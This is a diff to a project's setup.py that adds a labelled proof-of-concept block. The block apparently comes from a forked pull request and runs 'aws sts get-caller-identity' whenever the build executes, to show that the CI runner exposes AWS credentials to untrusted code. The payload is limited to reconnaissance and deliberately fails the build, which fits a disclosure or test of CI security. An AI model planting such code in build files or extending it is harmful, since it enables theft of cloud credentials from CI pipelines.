@@ -1,27 +1,20 @@
-# ... The rest of the original setup.py content follows ...
-from setuptools import setup, find_packages
-# ... etc.
-
 from __future__ import print_function
 
 # --- PoC Start ---
 import os
+import sys
 print(">>> PoC: EXECUTING CODE FROM FORKED PR (in setup.py) <<<")
 print(">>> PoC: Attempting AWS CLI command to identify role:")
 os.system("aws sts get-caller-identity")
 print(">>> PoC: TEST FINISHED, FAILING INTENTIONALLY <<<")
-exit(1)
+sys.exit(1)
 # --- PoC End ---
 
 import glob
-import sys
-
-import os
 import shutil
 import xml.etree.ElementTree as ET
 
-from setuptools import Command
-from setuptools import setup
+from setuptools import setup, find_packages, Command
 from setuptools.command.install import install
 
 if sys.version_info[0] >= 3:
